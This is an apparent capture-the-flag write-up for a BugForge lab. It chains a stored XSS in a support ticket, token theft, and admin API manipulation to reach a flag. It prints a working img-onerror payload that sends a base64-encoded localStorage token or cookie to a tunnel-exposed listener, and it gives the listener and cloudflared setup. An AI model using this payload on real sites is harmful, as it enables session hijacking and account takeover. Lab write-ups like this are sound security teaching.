# Cheesy Does It — cheesy-009 — Cheesy Does It

## 1. Register / Login

First, register an account on the BugForge web application and log in.

After logging in, navigate to the **Support** section.

---

## 2. Identify the XSS Injection Point

The support page contains a ticket form with fields such as:

* **Subject**
* **How can we help?**

The support functionality processes user-supplied content, so I tested whether JavaScript could be executed through the ticket content.

In the **Subject** field, enter:

```text
XSS
```

In the **How can we help?** field, use:

```html
<img src=x onerror="this.src='https://YOUR-TUNNEL-URL/?s='+btoa(localStorage.token||document.cookie||'none')">
```

The payload attempts to execute JavaScript when the image fails to load.

It then:

1. Checks for `localStorage.token`.
2. Falls back to `document.cookie`.
3. Base64-encodes the value using `btoa()`.
4. Sends the encoded value to our listener.

---

## 3. Create a Listener

Start a Python HTTP server:

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

The server listens on:

```text
http://0.0.0.0:8000/
```

---

## 4. Expose the Listener

Check whether Cloudflare Tunnel is installed:

```bash
which cloudflared
```

If it is installed, create a temporary tunnel:

```bash
cloudflared tunnel --url http://127.0.0.1:8000
```

Cloudflared provides a public URL similar to:

```text
https://nearest-paragraph-museum-structured.trycloudflare.com
```

Keep the tunnel running.

Replace `YOUR-TUNNEL-URL` in the XSS payload with this URL.

---

## 5. Submit the Support Ticket

Return to the Support page.

Set:

**Subject:**

```text
XSS
```

**How can we help?:**

```html
<img src=x onerror="this.src='https://YOUR-TUNNEL-URL/?s='+btoa(localStorage.token||document.cookie||'none')">
```

Submit the ticket.

The support/admin system processes the ticket, causing the JavaScript payload to execute in the privileged user's browser context.

---

## 6. Capture the Token

Return to the Python HTTP server.

A request similar to this appears:

```text
127.0.0.1 - - [26/Sep/2026 21:27:23]
"GET /?%20s=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnBaQ0k2TVN3aWRYTmxjbTVoYldVaU9pSmhaRzFwYmlJc0ltbGhkQ0k2TVRjNU1EUXpOemN5Tm4wLnh4am8xQm9sY1Q1dGpnRHpqTUVGS2ItM0dVNlR6b3YzczFKQnZVRVY3am8= HTTP/1.1" 200 -
```

The value after `s=` is Base64 encoded.

---

## 7. Decode the Base64 Value

Decode it using:

```bash
echo "ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnBaQ0k2TVN3aWRYTmxjbTVoYldVaU9pSmhaRzFwYmlJc0ltbGhkQ0k2TVRjNU1EUXpOemN5Tm4wLnh4am8xQm9sY1Q1dGpnRHpqTUVGS2ItM0dVNlR6b3YzczFKQnZVRVY3am8=" | base64 -d
```

The decoded result is a **JWT token**.

---

## 8. Replace the Local Storage Token

Open the web application's Developer Tools.

Navigate to:

```text
Application
    → Local Storage
```

Locate the application's authentication token and replace its value with the captured JWT.

Reload the application.

The session is now authenticated as an **administrator**.

---

## 9. Access the Admin Dashboard

Navigate to the **Admin Dashboard**.

Inspect the requests in the browser's Developer Tools or Burp Suite.

An administrative request can be observed for the users functionality:

```http
/api/admin/users
```

The application exposes functionality for viewing/editing users.

---

## 10. Manipulate the API Request

Select the relevant request and choose **Edit and Resend**.

Change the API endpoint from:

```http
/api/admin/users
```

to:

```http
/api/admin/flag
```

Send the modified request.

The server responds with the flag.

---

## 11. Flag

```text
bug{oIM3N9jzUKyXkPNqyvRyRHPmStaTMAlS}
```

## Attack Chain

The complete exploitation chain was:

```text
Support Ticket
      ↓
Stored XSS
      ↓
JavaScript executes in privileged context
      ↓
JWT extracted from localStorage
      ↓
JWT exfiltrated through HTTP request
      ↓
JWT Base64 decoded
      ↓
Token placed in localStorage
      ↓
Admin session obtained
      ↓
Admin API discovered
      ↓
/api/admin/users
      ↓
Modified to /api/admin/flag
      ↓
FLAG
```

## Vulnerabilities Demonstrated

* Stored Cross-Site Scripting (XSS)
* Sensitive token exposure through client-side storage
* Authentication/session token theft
* Insufficient protection of administrative functionality
* Improper authorization/API endpoint exposure
* API endpoint manipulation
